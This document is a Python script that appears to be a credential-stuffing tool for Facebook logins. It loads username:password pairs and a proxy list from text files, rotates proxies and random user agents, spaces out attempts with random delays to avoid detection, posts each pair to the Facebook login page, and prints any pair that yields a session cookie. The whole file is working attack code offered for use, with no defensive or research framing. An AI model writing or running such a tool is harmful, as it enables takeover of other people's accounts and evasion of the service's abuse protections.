# credentials.txt should be in the same directory as this script
# Format of credentials.txt:
"""
username1@email.com:password123
username2@email.com:password456
email@domain.com:mypassword
phone_number:password789
"""

# proxies.txt should also be in the same directory
# Format of proxies.txt:
"""
ip1:port1
ip2:port2
"""

import time
import random
import requests
from datetime import datetime, timedelta
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor

class FacebookLoginTester:
    def __init__(self):
        self.session = requests.Session()
        self.proxy_list = self.load_proxies()
        self.attempt_history = {}
        self.success_found = False
        
    def load_proxies(self):
        # Load list of proxies from proxies.txt in same directory
        try:
            with open("proxies.txt") as f:
                return [line.strip() for line in f.readlines()]
        except FileNotFoundError:
            print("Warning: proxies.txt not found in current directory")
            return []
    
    def get_random_proxy(self):
        return random.choice(self.proxy_list) if self.proxy_list else None
    
    def can_attempt_login(self, username):
        if username in self.attempt_history:
            last_attempt = self.attempt_history[username]
            if datetime.now() - last_attempt < timedelta(hours=24):
                return False
        return True
    
    def try_login(self, username, password):
        if not self.can_attempt_login(username):
            return False
            
        try:
            ua = UserAgent()
            headers = {
                'User-Agent': ua.random,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'DNT': '1',
            }
            
            proxy = self.get_random_proxy()
            proxies = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            } if proxy else None
            
            response = self.session.get(
                'https://www.facebook.com',
                headers=headers,
                proxies=proxies,
                timeout=10
            )
            
            time.sleep(random.uniform(2, 5))
            
            login_data = {
                'email': username,
                'pass': password,
            }
            
            response = self.session.post(
                'https://www.facebook.com/login',
                data=login_data,
                headers=headers,
                proxies=proxies,
                timeout=10
            )
            
            self.attempt_history[username] = datetime.now()
            
            if 'c_user' in self.session.cookies:
                print(f"Success! Username: {username}, Password: {password}")
                self.success_found = True
                return True
                
        except Exception as e:
            print(f"Error with {username}: {str(e)}")
            time.sleep(random.uniform(5, 10))
            
        return False

def main():
    try:
        # Load credentials from credentials.txt in same directory
        with open("credentials.txt") as f:
            credentials = []
            for line in f:
                line = line.strip()
                if ':' not in line:
                    print(f"Skipping invalid line: {line}")
                    continue
                username, password = line.split(':', 1)
                if not username or not password:
                    print(f"Skipping invalid credential pair: {line}")
                    continue
                credentials.append((username, password))
        
        if not credentials:
            print("No valid credentials found in credentials.txt")
            print("Please ensure credentials.txt exists in the same directory as this script")
            print("Format should be: username:password")
            print("One credential pair per line")
            return
            
        print(f"Loaded {len(credentials)} credential pairs to test")
        
    except FileNotFoundError:
        print("credentials.txt not found in current directory!")
        print("Please create credentials.txt in the same directory as this script with format:")
        print("username1@email.com:password123")
        print("username2@email.com:password456")
        return
    
    tester = FacebookLoginTester()
    
    with ThreadPoolExecutor(max_workers=3) as executor:
        for i in range(0, len(credentials), 3):
            if tester.success_found:
                break
                
            batch = credentials[i:i+3]
            futures = []
            
            for username, password in batch:
                future = executor.submit(tester.try_login, username, password)
                futures.append(future)
            
            for future in futures:
                future.result()
            
            if not tester.success_found:
                delay = random.uniform(120, 300)
                print(f"Batch complete. Waiting {delay:.0f} seconds...")
                time.sleep(delay)

if __name__ == "__main__":
    main()



